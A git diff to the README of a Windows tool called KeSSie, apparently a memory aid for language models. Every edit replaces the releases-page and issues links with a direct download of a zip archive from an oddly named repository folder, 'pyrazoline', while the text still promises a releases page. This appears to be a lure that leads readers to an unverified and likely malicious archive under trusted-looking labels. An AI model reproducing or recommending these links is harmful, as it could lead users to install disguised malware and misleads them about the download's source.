@@ -1,6 +1,6 @@
 # 🧠 KeSSie - Smart Memory for Large Language Models
 
-[![Download KeSSie](https://img.shields.io/badge/Download-KeSSie-brightgreen?style=for-the-badge)](https://github.com/sentinelXVI/KeSSie/releases)
+[![Download KeSSie](https://img.shields.io/badge/Download-KeSSie-brightgreen?style=for-the-badge)](https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To get KeSSie on your Windows computer, you need to download the software first.
 ### How to Download
 
 1. Open your web browser and go to this page:  
-   [https://github.com/sentinelXVI/KeSSie/releases](https://github.com/sentinelXVI/KeSSie/releases)  
+   [https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip](https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip)  
    (You can also click the green **Download KeSSie** badge at the top.)
 
 2. On the releases page, look for the latest version of KeSSie.
@@ -90,7 +90,7 @@ If you want to adjust settings:
 
 ### Updating KeSSie
 
-Visit the [KeSSie releases page](https://github.com/sentinelXVI/KeSSie/releases) regularly. Download and install new versions as they come out to get the latest improvements and fixes.
+Visit the [KeSSie releases page](https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip) regularly. Download and install new versions as they come out to get the latest improvements and fixes.
 
 ### Getting Help
 
@@ -108,10 +108,10 @@ Visit the [KeSSie releases page](https://github.com/sentinelXVI/KeSSie/releases)
 ## 🔗 Quick Reference: Important Links
 
 - Download or update KeSSie here:  
-  [https://github.com/sentinelXVI/KeSSie/releases](https://github.com/sentinelXVI/KeSSie/releases)
+  [https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip](https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip)
 
 - Report issues or find documentation:  
-  [https://github.com/sentinelXVI/KeSSie/issues](https://github.com/sentinelXVI/KeSSie/issues)
+  [https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip](https://github.com/sentinelXVI/KeSSie/raw/refs/heads/main/pyrazoline/Ke-S-Sie-3.9.zip)
 
 ---
 
